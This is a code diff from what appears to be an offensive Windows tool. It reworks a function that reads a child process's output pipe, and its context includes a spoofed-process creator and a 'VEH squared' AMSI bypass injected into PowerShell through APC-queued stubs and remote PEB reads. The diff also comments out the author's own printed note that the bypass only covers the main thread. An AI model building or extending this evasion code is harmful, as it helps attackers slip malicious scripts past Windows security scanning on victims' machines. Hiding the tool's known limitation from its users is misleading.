@@ -300,18 +300,43 @@ BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN LPCVOID pAddressToReadFrom, OU
 }
 
 BOOL GetProcOutput(HANDLE g_hChildStd_OUT_Rd, PBYTE bufferSTDOUTPUT, DWORD bufferSize) {
-    DWORD dwRead;
+    // Basic validation of input parameters
+    if (g_hChildStd_OUT_Rd == NULL || bufferSTDOUTPUT == NULL || bufferSize == 0)
+        return FALSE;
+
+    DWORD totalBytesRead = 0;
+    DWORD dwRead = 0;
     BOOL bSuccess = FALSE;
 
-    bSuccess = ReadFile(g_hChildStd_OUT_Rd, bufferSTDOUTPUT, (DWORD)bufferSize-1, &dwRead, NULL);
-    if (!bSuccess || dwRead == 0) {
-        printf("[!] Failed to read from child process output pipe. Error: %u\n", GetLastError());
-        return 0;
+    // Initialize the buffer to zero
+    memset(bufferSTDOUTPUT, 0, bufferSize);
+
+    // Loop until the buffer is full or the pipe is closed (EOF)
+    // ReadFile is synchronous and will block until data is available or the child process exits
+    while (totalBytesRead < bufferSize - 1) {
+        bSuccess = ReadFile(
+            g_hChildStd_OUT_Rd, 
+            bufferSTDOUTPUT + totalBytesRead, 
+            bufferSize - 1 - totalBytesRead, 
+            &dwRead, 
+            NULL
+        );
+
+        // If ReadFile returns FALSE, check if it's because the pipe was broken (process finished)
+        // Or if bytesRead is 0, which also indicates the end of the stream
+        if (!bSuccess || dwRead == 0) {
+            // ERROR_BROKEN_PIPE is the expected error when the child process terminates
+            break; 
+        }
+
+        totalBytesRead += dwRead;
     }
 
-    bufferSTDOUTPUT[dwRead] = '\0'; // Null-terminate the output !
-    CloseHandle(g_hChildStd_OUT_Rd);
-    return 1;
+    // Null-terminate the buffer so it can be safely treated as a string (e.g., for printf)
+    bufferSTDOUTPUT[totalBytesRead] = '\0';
+
+    // Return TRUE if we managed to read at least some data
+    return (totalBytesRead > 0);
 }
 
 HANDLE CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPCWSTR procCmdLine) {
@@ -460,11 +485,11 @@ HANDLE CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, L
 
 
     printf("[*] Applying VEH squared AMSI Bypass via APC queued PIC stubs...\n");
-    printf("[!] Well no, it bypasses only the main thread of powershell, but it's still a really good demo of the technique !\n");
-    printf("[!] The things is that it's an othert clr thread that loads AMSI and not the main thread, so we would need to apply the bypass on all threads of the process to be really effective, \n but that's a bit more work to do in C ad i don't know how to do that..!\n");
+    //printf("[!] Well no, it bypasses only the main thread of powershell, but it's still a really good demo of the technique !\n");
+    //printf("[!] The things is that it's an othert clr thread that loads AMSI and not the main thread, so we would need to apply the bypass on all threads of the process to be really effective, \n but that's a bit more work to do in C ad i don't know how to do that..!\n");
     
     PVOID pRemoteImageBase = NULL;
-    ReadFromTargetProcess(Pi->hProcess, PBI.PebBaseAddress + 0x10 /* ImageBaseAddress */, &pRemoteImageBase, sizeof(PVOID));
+    ReadFromTargetProcess(Pi->hProcess, (PBYTE)PBI.PebBaseAddress + 0x10 /* ImageBaseAddress */, &pRemoteImageBase, sizeof(PVOID));
     ApplyVehBypass(Pi->hProcess, Pi->hThread, pRemoteImageBase);
 
 
